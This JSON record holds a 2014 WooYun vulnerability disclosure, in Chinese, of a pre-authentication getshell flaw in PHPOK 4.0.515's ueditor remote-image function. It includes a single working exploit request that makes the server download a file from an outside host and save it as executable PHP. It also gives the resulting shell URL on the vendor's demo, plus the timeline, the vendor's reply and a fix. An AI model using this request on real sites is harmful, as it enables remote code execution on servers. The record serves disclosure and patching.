{"id": 1668, "wybug_id": "wooyun-2014-063106", "wybug_title": "phpok4通杀前台getshell 4.0.515官方demo测试成功", "wybug_corp": "phpok.com", "wybug_author": "索马里的海贼", "wybug_date": "2014-06-03 12:01", "wybug_open_date": "2014-09-01 12:02", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-01：\t细节向公众公开  简要描述： 无任何限制，不用注册账号，不用csrf，不用注入。一个请求直接getshell。不得不说phpok的输入处理做的还是不错的。。。不过这里就出了一个问题 详细说明：  /framework/www/ueditor_control.php行61remote_image_f函数没对远程文件后缀做检查直接保存到本地这个真心没什么好分析的我就不贴代码分析了   漏洞证明：  构造请求\n/index.php?c=ueditor&f=remote_image&upfile=http://qaz.me/1.txt?.php\n我这里1.txt的内容是\n<?php phpinfo();?>\n测试问题嘛 不做破坏\n\nshell地址直接返回了。这里不返回也没事，文件名可以自己算出来。http://www.phpok.com/res/201406/01/d0cb55e3d1b41b9a_36_0.php\n\n   修复方案：  远程文件也要判断后缀   版权声明：转载请注明来源 索马里的海贼@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-03 14:01 厂商回复： 谢谢您的意见，最近发现这个问题很严重~~，正在处理中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-13 22:02 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  构造蛮有意思    \n     2014-08-06 13:33 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  和之前的ueditor jsp版getshell异曲同工阿，顶matt    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}